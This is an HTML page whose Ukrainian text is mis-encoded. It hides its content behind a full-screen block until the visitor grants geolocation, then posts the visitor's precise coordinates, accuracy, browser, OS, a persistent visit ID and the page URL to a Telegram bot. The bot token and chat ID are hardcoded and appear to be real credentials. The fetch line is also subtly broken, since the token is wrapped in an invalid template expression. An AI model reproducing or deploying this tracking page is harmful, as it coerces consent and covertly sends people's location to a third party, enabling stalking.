<!DOCTYPE html>
<html lang="uk">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>–ì–µ–æ–∑–∞—Ö–∏—â–µ–Ω–∏–π —Å–∞–π—Ç</title>
  <style>
    body {
      font-family: sans-serif;
      margin: 0;
      padding: 0;
    }

    #geo-block {
      position: fixed;
      top: 0; left: 0;
      width: 100vw;
      height: 100vh;
      background: white;
      color: black;
      z-index: 9999;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
      padding: 2rem;
    }

    #main-content {
      display: none;
      padding: 2rem;
    }
  </style>
</head>
<body>

  <div id="geo-block">
    ‚õî –î–ª—è –ø–µ—Ä–µ–≥–ª—è–¥—É —Å–∞–π—Ç—É –ø–æ—Ç—Ä—ñ–±–Ω–æ –Ω–∞–¥–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –≥–µ–æ–ª–æ–∫–∞—Ü—ñ—ó.
    <br><br>
    –û–Ω–æ–≤—ñ—Ç—å —Å—Ç–æ—Ä—ñ–Ω–∫—É —Ç–∞ –¥–æ–∑–≤–æ–ª—å—Ç–µ –¥–æ—Å—Ç—É–ø.
  </div>

  <div id="main-content">
    ‚úÖ –î–æ—Å—Ç—É–ø –¥–æ–∑–≤–æ–ª–µ–Ω–æ. –í—ñ—Ç–∞—î–º–æ –Ω–∞ —Å–∞–π—Ç—ñ!
    <p>–í–∞—à —Å–µ–∞–Ω—Å –∞–∫—Ç–∏–≤–Ω–∏–π, —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –Ω–∞–¥—ñ—Å–ª–∞–Ω–∞ –¥–æ Telegram.</p>
  </div>

  <script>
    const TOKEN = '–¢–í–û–ô_–¢–û–ö–ï–ù';
    const CHAT_ID = '–¢–í–û–ô_CHAT_ID';

    // === –£–Ω—ñ–∫–∞–ª—å–Ω–∏–π ID –≤—ñ–¥–≤—ñ–¥—É–≤–∞—á–∞ ===
    let visitId = localStorage.getItem('visit_id');
    if (!visitId) {
      visitId = Math.random().toString(36).substring(2);
      localStorage.setItem('visit_id', visitId);
    }

    // === –ë—Ä–∞—É–∑–µ—Ä —Ç–∞ –û–° ===
    function getBrowserInfo() {
      const ua = navigator.userAgent;
      if (ua.includes("Chrome")) return "Chrome";
      if (ua.includes("Firefox")) return "Firefox";
      if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
      if (ua.includes("Edge")) return "Edge";
      return "–ù–µ–≤—ñ–¥–æ–º–∏–π";
    }

    function getOSInfo() {
      const ua = navigator.userAgent;
      if (ua.includes("Win")) return "Windows";
      if (ua.includes("Mac")) return "macOS";
      if (ua.includes("Linux")) return "Linux";
      if (ua.includes("Android")) return "Android";
      if (ua.includes("like Mac")) return "iOS";
      return "–ù–µ–≤—ñ–¥–æ–º–∞";
    }

    const browser = getBrowserInfo();
    const os = getOSInfo();

    // === –ì–µ–æ–ª–æ–∫–∞—Ü—ñ—è –∑ –æ–±—Ä–æ–±–∫–æ—é ===
    navigator.geolocation.getCurrentPosition(
      function(position) {
        document.getElementById('geo-block').style.display = 'none';
        document.getElementById('main-content').style.display = 'block';

        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const acc = Math.round(position.coords.accuracy);

        const message = `
üßë‚Äçüíª –ù–æ–≤–∏–π –≤—ñ–¥–≤—ñ–¥—É–≤–∞—á —Å–∞–π—Ç—É
üïí –ß–∞—Å: ${new Date().toLocaleTimeString()}
üßæ ID –≤—ñ–∑–∏—Ç—É: ${visitId}

üì± –ü—Ä–∏—Å—Ç—Ä—ñ–π: ${browser} / ${os}
üìç –ö–æ–æ—Ä–¥–∏–Ω–∞—Ç–∏: ${lat}, ${lon}
üéØ –¢–æ—á–Ω—ñ—Å—Ç—å: ¬±${acc} –º
üåê –°—Ç–æ—Ä—ñ–Ω–∫–∞: ${location.href}
`;

        fetch(`https://api.telegram.org/bot${7643687227:AAGIfbY0dPgbCQ0d0402dk1_8Fn6nS7lOV0}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: 1938874314,
            text: message
          })
        });
      },

      function(error) {
        // –Ø–∫—â–æ –≤—ñ–¥–º–æ–≤–ª–µ–Ω–æ ‚Äî –∑–∞–ª–∏—à–∞—î–º–æ –±–ª–æ–∫—É–≤–∞–Ω–Ω—è
        console.warn("–ì–µ–æ–ª–æ–∫–∞—Ü—ñ—è –≤—ñ–¥—Ö–∏–ª–µ–Ω–∞:", error);
      }
    );
  </script>

</body>
</html>
